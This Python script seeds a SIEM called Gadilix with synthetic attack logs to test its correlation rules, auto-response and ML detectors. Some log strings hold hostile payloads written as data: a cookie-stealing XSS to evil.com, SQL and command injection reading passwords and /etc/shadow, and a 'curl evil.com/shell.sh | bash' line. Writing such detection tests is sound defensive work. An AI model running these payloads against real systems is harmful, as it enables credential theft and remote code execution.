#!/usr/bin/env python3
"""
seed_new_features_test.py
==========================
Test seed for ALL new Gadilix features:

  NEW CORRELATION RULES (5):
    BRUTE_THEN_SUCCESS    — brute force + successful login same IP
    DATA_EXFIL_CHAIN      — exploit + large data transfer
    MULTI_VECTOR_ATTACK   — web + network + auth same IP simultaneously
    ACCOUNT_TAKEOVER      — lockout + success same user
    DEFENSE_EVASION       — audit log cleared + persistence same machine

  AUTO-RESPONSE:
    CRITICAL incidents → auto block IP + isolate machine

  ML v2 ADVANCED:
    Isolation Forest      — 14 features (was 6)
    Behavioral Profiling  — unusual hour, rare event type
    Velocity Detector     — rate spike detection

Usage:
    python seed_new_features_test.py
    python seed_new_features_test.py --server http://192.168.1.100:5000
    python seed_new_features_test.py --only brute_success exfil
    python seed_new_features_test.py --skip ml
"""

import time
import random
import argparse
import requests
import sys

DEFAULT_SERVER = "http://localhost:5000"
DELAY          = 0.25

# Colors
R = "\033[91m"; Y = "\033[93m"; G = "\033[92m"
C = "\033[96m"; M = "\033[95m"; DIM = "\033[2m"
BLD = "\033[1m"; RST = "\033[0m"

stats = {"sent": 0, "ok": 0, "fail": 0}


def ship(server, agent_id, agent_os, source_ip, username,
         event_type, severity, raw_message, delay=DELAY):
    payload = {
        "agent_id":    agent_id,
        "agent_os":    agent_os,
        "source_ip":   source_ip,
        "username":    username,
        "event_type":  event_type,
        "severity":    severity,
        "raw_message": raw_message,
    }
    try:
        r = requests.post(f"{server}/api/logs/ingest", json=payload, timeout=5)
        ok = r.status_code == 201
        stats["sent"] += 1
        if ok: stats["ok"] += 1
        else:  stats["fail"] += 1
        sc  = {
            "CRITICAL": f"{BLD}{R}", "HIGH": R,
            "MEDIUM": Y, "LOW": C, "INFO": DIM
        }.get(severity, "")
        sym = f"{G}✓{RST}" if ok else f"{R}✗{RST}"
        print(f"  {sym} [{sc}{severity:8}{RST}] {agent_id:20} {source_ip or '—':18} {raw_message[:55]}")
        time.sleep(delay)
        return ok
    except requests.exceptions.ConnectionError:
        print(f"\n{R}{BLD}  ✗ Cannot connect to {server}{RST}")
        print(f"  Start server: python MAIN.PY\n")
        sys.exit(1)


def section(title, color=C):
    print(f"\n{BLD}{color}{'─'*62}\n  {title}\n{'─'*62}{RST}")


# ═══════════════════════════════════════════════════════════════════
# RULE 1: BRUTE_THEN_SUCCESS
# ═══════════════════════════════════════════════════════════════════
def seed_brute_then_success(server):
    section("NEW RULE: BRUTE_THEN_SUCCESS — crack confirmé depuis 77.88.55.80", R)
    print(f"  {DIM}5 échecs de login → 1 connexion réussie = mot de passe cracké{RST}\n")
    fast = DELAY * 0.3

    for i in range(5):
        ship(server, "linux-prod-01", "linux", "77.88.55.80", "alice",
             "failed_login", "MEDIUM",
             f"Mar 24 02:1{i}:00 server sshd[500{i}]: Failed password for alice from 77.88.55.80 port 22 ssh2",
             fast)

    time.sleep(0.3)
    # Successful login after brute force — TRIGGERS BRUTE_THEN_SUCCESS
    ship(server, "linux-prod-01", "linux", "77.88.55.80", "alice",
         "accepted_login", "INFO",
         "Mar 24 02:16:00 server sshd[5010]: Accepted password for alice from 77.88.55.80 port 22 ssh2",
         fast)
    print(f"\n  {G}✓ BRUTE_THEN_SUCCESS should trigger — CRITICAL incident + auto block 77.88.55.80{RST}")


# ═══════════════════════════════════════════════════════════════════
# RULE 2: DATA_EXFIL_CHAIN
# ═══════════════════════════════════════════════════════════════════
def seed_data_exfil(server):
    section("NEW RULE: DATA_EXFIL_CHAIN — vol de données depuis 185.100.22.1", R)
    print(f"  {DIM}Exploitation web + 500MB transféré = vol de données actif{RST}\n")
    fast = DELAY * 0.3

    ship(server, "web-server-01", "linux", "185.100.22.1", None,
         "sql_injection", "HIGH",
         "GET /login?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 200",
         fast)

    ship(server, "web-server-01", "linux", "185.100.22.1", None,
         "command_injection", "CRITICAL",
         "POST /api/ping?host=127.0.0.1;cat /etc/shadow HTTP/1.1 200",
         fast)

    time.sleep(0.3)
    # Large data transfer — TRIGGERS DATA_EXFIL_CHAIN
    ship(server, "web-server-01", "linux", "185.100.22.1", None,
         "data_exfiltration", "CRITICAL",
         "ALLOW OUTBOUND 192.168.1.10 -> 185.100.22.1:443 500 MB transferred upload duration=60s",
         fast)
    print(f"\n  {G}✓ DATA_EXFIL_CHAIN should trigger — CRITICAL + auto block + isolate web-server-01{RST}")


# ═══════════════════════════════════════════════════════════════════
# RULE 3: MULTI_VECTOR_ATTACK
# ═══════════════════════════════════════════════════════════════════
def seed_multi_vector(server):
    section("NEW RULE: MULTI_VECTOR_ATTACK — attaque multi-surface depuis 203.55.33.99", Y)
    print(f"  {DIM}Web + réseau + auth simultanés = attaquant sophistiqué{RST}\n")
    fast = DELAY * 0.3

    # Web attack
    ship(server, "web-server-02", "linux", "203.55.33.99", None,
         "sql_injection", "HIGH",
         "GET /search?q=' OR 1=1-- HTTP/1.1 200 — SQL injection attempt",
         fast)

    ship(server, "web-server-02", "linux", "203.55.33.99", None,
         "xss_attempt", "HIGH",
         "GET /comment?text=<script>document.location='http://evil.com/'+document.cookie</script>",
         fast)

    # Network attack
    ship(server, "firewall-01", "linux", "203.55.33.99", None,
         "port_scan", "HIGH",
         "Nmap scan report for 192.168.1.0/24 Host is up 1000 ports scanned",
         fast)

    # Auth attack
    ship(server, "linux-prod-02", "linux", "203.55.33.99", "admin",
         "failed_login", "MEDIUM",
         "Mar 24 03:00:01 server sshd[6001]: Failed password for admin from 203.55.33.99 port 22 ssh2",
         fast)

    ship(server, "linux-prod-02", "linux", "203.55.33.99", "root",
         "failed_login", "MEDIUM",
         "Mar 24 03:00:02 server sshd[6002]: Failed password for root from 203.55.33.99 port 22 ssh2",
         fast)

    ship(server, "linux-prod-02", "linux", "203.55.33.99", "ubuntu",
         "invalid_user", "MEDIUM",
         "Mar 24 03:00:03 server sshd[6003]: Invalid user ubuntu from 203.55.33.99 port 22",
         fast)

    print(f"\n  {G}✓ MULTI_VECTOR_ATTACK should trigger — HIGH incident{RST}")


# ═══════════════════════════════════════════════════════════════════
# RULE 4: ACCOUNT_TAKEOVER
# ═══════════════════════════════════════════════════════════════════
def seed_account_takeover(server):
    section("NEW RULE: ACCOUNT_TAKEOVER — compte bob compromis", R)
    print(f"  {DIM}Compte verrouillé puis connexion réussie = compte compromis{RST}\n")
    fast = DELAY * 0.3

    # Account lockout for user bob
    ship(server, "win-dc-01", "windows", "10.0.99.50", "bob",
         "account_lockout", "HIGH",
         "EventID=4740 TimeCreated=2026-03-24T04:00:00 TargetUserName=bob CallerComputerName=WORKSTATION-99",
         fast)

    time.sleep(0.5)

    # Then a successful login for bob — TRIGGERS ACCOUNT_TAKEOVER
    ship(server, "win-dc-01", "windows", "10.0.99.50", "bob",
         "accepted_login", "INFO",
         "EventID=4624 TimeCreated=2026-03-24T04:02:00 Account=bob IpAddress=10.0.99.50 LogonType=3",
         fast)

    print(f"\n  {G}✓ ACCOUNT_TAKEOVER should trigger — CRITICAL incident{RST}")


# ═══════════════════════════════════════════════════════════════════
# RULE 5: DEFENSE_EVASION
# ═══════════════════════════════════════════════════════════════════
def seed_defense_evasion(server):
    section("NEW RULE: DEFENSE_EVASION — traces effacées + persistence sur win-dc-02", R)
    print(f"  {DIM}Audit log effacé + nouveau service = attaquant qui se cache{RST}\n")
    fast = DELAY * 0.3

    # Audit log cleared
    ship(server, "win-dc-02", "windows", None, "Administrator",
         "audit_log_cleared", "CRITICAL",
         "EventID=1102 TimeCreated=2026-03-24T05:00:00 SubjectUserName=Administrator Message=The audit log was cleared",
         fast)

    # New service installed — TRIGGERS DEFENSE_EVASION
    ship(server, "win-dc-02", "windows", None, "SYSTEM",
         "new_service_installed", "HIGH",
         "EventID=7045 TimeCreated=2026-03-24T05:01:00 ServiceName=WindowsBackdoor ImagePath=C:\\Windows\\Temp\\svc.exe StartType=auto",
         fast)

    # Scheduled task created too
    ship(server, "win-dc-02", "windows", None, "SYSTEM",
         "scheduled_task_created", "HIGH",
         "EventID=4698 TimeCreated=2026-03-24T05:02:00 TaskName=\\Updater SubjectUserName=SYSTEM",
         fast)

    print(f"\n  {G}✓ DEFENSE_EVASION should trigger — CRITICAL incident + auto block{RST}")


# ═══════════════════════════════════════════════════════════════════
# AUTO-RESPONSE TEST
# ═══════════════════════════════════════════════════════════════════
def seed_auto_response(server):
    section("AUTO-RESPONSE — KILL_CHAIN complet depuis 45.33.32.200 → auto-isolate", R)
    print(f"  {DIM}Attack complète → incident CRITICAL → auto block IP + isolate{RST}\n")
    fast = DELAY * 0.2

    ip = "45.33.32.200"

    # Recon
    ship(server, "linux-server-03", "linux", ip, None, "port_scan", "HIGH",
         "Nmap scan 192.168.1.5 65535 ports scanned masscan", fast)
    ship(server, "linux-server-03", "linux", ip, None, "web_scanner", "HIGH",
         "GET /index.php User-Agent: nikto/2.1.6", fast)

    # Initial access
    for i in range(5):
        ship(server, "linux-server-03", "linux", ip, "root", "failed_login", "MEDIUM",
             f"Failed password for root from {ip} port 22 ssh2 attempt {i+1}", fast)
    ship(server, "linux-server-03", "linux", ip, "root", "accepted_login", "INFO",
         f"Accepted password for root from {ip} port 22 ssh2", fast)

    # Privesc
    ship(server, "linux-server-03", "linux", ip, "www-data", "privilege_escalation", "HIGH",
         f"sudo: www-data USER=root COMMAND=/bin/bash", fast)

    # Persistence
    ship(server, "linux-server-03", "linux", ip, "root", "user_created", "MEDIUM",
         "useradd: new user name=hax0r, UID=1338", fast)
    ship(server, "linux-server-03", "linux", ip, "root", "crontab_modified", "HIGH",
         "cron: root REPLACE (crontabs/root) — reverse shell", fast)

    # Exfil
    ship(server, "linux-server-03", "linux", ip, "root", "data_exfiltration", "CRITICAL",
         f"ALLOW OUTBOUND 192.168.1.5 -> {ip}:443 500 MB transferred upload", fast)

    print(f"\n  {G}✓ KILL_CHAIN + DATA_EXFIL_CHAIN should trigger{RST}")
    print(f"  {R}  → Auto: IP {ip} blocked + linux-server-03 isolated{RST}")
    print(f"  {C}  → Check SOAR page for auto-generated actions{RST}")
    print(f"  {C}  → Check Incidents page for 🔒 AUTO badge{RST}")


# ═══════════════════════════════════════════════════════════════════
# ML v2 — BEHAVIORAL PROFILING TEST
# ═══════════════════════════════════════════════════════════════════
def seed_ml_behavioral(server):
    section("ML v2 — BEHAVIORAL PROFILING — créer baseline puis anomalie", M)
    print(f"  {DIM}Phase 1: 20 logs normaux pour établir le profil de carol{RST}")
    print(f"  {DIM}Phase 2: Login à 3h du matin depuis IP inconnue = anomalie comportementale{RST}\n")

    # Phase 1: Normal behavior for user carol — business hours, normal IPs
    for i in range(20):
        hour = random.choice([8, 9, 10, 11, 14, 15, 16, 17])
        ship(server, "linux-prod-03", "linux", "192.168.1.50", "carol",
             "accepted_login", "INFO",
             f"Mar 24 {hour:02d}:{i:02d}:00 server sshd: Accepted password for carol from 192.168.1.50 port 22 ssh2",
             DELAY * 0.1)

    print(f"\n  {DIM}Phase 2: Anomalie comportementale — 3h du matin, IP inconnue...{RST}\n")
    time.sleep(0.5)

    # Phase 2: Anomaly — login at 3am from unknown IP
    ship(server, "linux-prod-03", "linux", "172.16.200.99", "carol",
         "accepted_login", "INFO",
         "Mar 24 03:00:00 server sshd: Accepted password for carol from 172.16.200.99 port 22 ssh2",
         DELAY)

    # Admin event from non-admin user
    ship(server, "linux-prod-03", "linux", "172.16.200.99", "carol",
         "sudo_command", "LOW",
         "Mar 24 03:01:00 server sudo: carol : USER=root ; COMMAND=/bin/bash",
         DELAY)

    print(f"\n  {G}✓ Behavioral profiling should detect anomaly for user carol{RST}")
    print(f"  {DIM}  (requires ML retrain — wait 5 min or check after next cycle){RST}")


# ═══════════════════════════════════════════════════════════════════
# ML v2 — VELOCITY DETECTOR TEST
# ═══════════════════════════════════════════════════════════════════
def seed_ml_velocity(server):
    section("ML v2 — VELOCITY DETECTOR — pic de fréquence détecté", M)
    print(f"  {DIM}Envoyer 30 events en 2 minutes depuis 10.99.88.77 = vélocité anormale{RST}\n")

    # Rapid fire events — should trigger velocity spike
    for i in range(30):
        ship(server, "linux-prod-02", "linux", "10.99.88.77", f"user{i % 5}",
             "failed_login", "MEDIUM",
             f"Mar 24 06:{i//60:02d}:{i%60:02d} server sshd: Failed password for user{i%5} from 10.99.88.77 port 22",
             DELAY * 0.05)   # very fast

    print(f"\n  {G}✓ Velocity spike should be detected — 30 events in ~2min{RST}")
    print(f"  {DIM}  ML_ANOMALY alerts with 'velocity spike' in description{RST}")


# ═══════════════════════════════════════════════════════════════════
# ML v2 — BASELINE THEN ANOMALY
# ═══════════════════════════════════════════════════════════════════
def seed_ml_isolation_forest(server):
    section("ML v2 — ISOLATION FOREST — anomalie horaire (3h du matin)", M)
    print(f"  {DIM}Baseline normal → connexions inhabituelles 3h du matin{RST}\n")

    # Baseline: normal activity during business hours
    for i in range(15):
        hour = random.choice([9, 10, 11, 14, 15, 16])
        ship(server, "linux-prod-01", "linux",
             f"192.168.1.{random.randint(10,20)}", "sysadmin",
             "accepted_login", "INFO",
             f"Mar 24 {hour:02d}:{i:02d}:00 server sshd: Accepted password for sysadmin",
             DELAY * 0.1)

    print(f"\n  {DIM}Anomaly: connexions suspectes à 3h du matin...{RST}\n")

    # Anomaly: unusual hour + suspicious event types
    for i in range(5):
        ship(server, "linux-prod-01", "linux", f"10.50.{i}.100", "root",
             "failed_login", "MEDIUM",
             f"Mar 24 03:0{i}:00 server sshd: Failed password for root from 10.50.{i}.100 port 22",
             DELAY)

    ship(server, "linux-prod-01", "linux", "10.50.0.100", "root",
         "sudo_command", "LOW",
         "Mar 24 03:10:00 server sudo: root : USER=root ; COMMAND=/bin/bash -c 'curl http://evil.com/shell.sh | bash'",
         DELAY)

    print(f"\n  {G}✓ Isolation Forest should detect time-based anomalies{RST}")


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="Gadilix — New Features Test Seed",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Sections disponibles:
  brute_success   BRUTE_THEN_SUCCESS rule
  exfil           DATA_EXFIL_CHAIN rule
  multi_vector    MULTI_VECTOR_ATTACK rule
  account_takeover ACCOUNT_TAKEOVER rule
  defense_evasion DEFENSE_EVASION rule
  auto_response   Full KILL_CHAIN + auto-response
  ml_behavior     ML Behavioral Profiling
  ml_velocity     ML Velocity Detector
  ml_if           ML Isolation Forest

Examples:
  python seed_new_features_test.py
  python seed_new_features_test.py --only brute_success exfil
  python seed_new_features_test.py --skip ml_behavior ml_velocity
        """
    )
    parser.add_argument("--server", default=DEFAULT_SERVER)
    parser.add_argument("--only",   nargs="+", choices=[
        "brute_success","exfil","multi_vector","account_takeover",
        "defense_evasion","auto_response","ml_behavior","ml_velocity","ml_if"
    ])
    parser.add_argument("--skip",   nargs="+", choices=[
        "brute_success","exfil","multi_vector","account_takeover",
        "defense_evasion","auto_response","ml_behavior","ml_velocity","ml_if"
    ])
    args = parser.parse_args()

    print(f"""
{BLD}{'═'*62}
  GADILIX — NEW FEATURES TEST SEED
  Server : {args.server}
{'═'*62}{RST}
""")

    sections = {
        "brute_success":    seed_brute_then_success,
        "exfil":            seed_data_exfil,
        "multi_vector":     seed_multi_vector,
        "account_takeover": seed_account_takeover,
        "defense_evasion":  seed_defense_evasion,
        "auto_response":    seed_auto_response,
        "ml_behavior":      seed_ml_behavioral,
        "ml_velocity":      seed_ml_velocity,
        "ml_if":            seed_ml_isolation_forest,
    }

    to_run = list(sections.keys())
    if args.only:
        to_run = [s for s in to_run if s in args.only]
    if args.skip:
        to_run = [s for s in to_run if s not in args.skip]

    for name in to_run:
        sections[name](args.server)

    print(f"""
{BLD}{'═'*62}
  TERMINÉ
{'═'*62}{RST}
  {G}Envoyés : {stats['sent']}{RST}
  {G}OK      : {stats['ok']}{RST}
  {R}Erreurs : {stats['fail']}{RST}

{BLD}Vérifications à faire :{RST}
  {C}1. Incidents page{RST}    — Run Correlation Now → 5+ nouveaux incidents
  {C}2. Badge AUTO{RST}         — 🔒 AUTO sur KILL_CHAIN, EXFIL, BRUTE_SUCCESS
  {C}3. SOAR page{RST}          — Actions auto-générées (block_ip, isolate_host)
  {C}4. Alerts page{RST}        — ML_ANOMALY avec score et raison détaillée
  {C}5. Settings → ML{RST}      — Stats ML engine (après retrain ~5min)
  {C}6. Settings → Corrélation{RST} — 10 règles actives
  {C}7. Settings → Auto-Response{RST} — Status des réponses automatiques
""")


if __name__ == "__main__":
    main()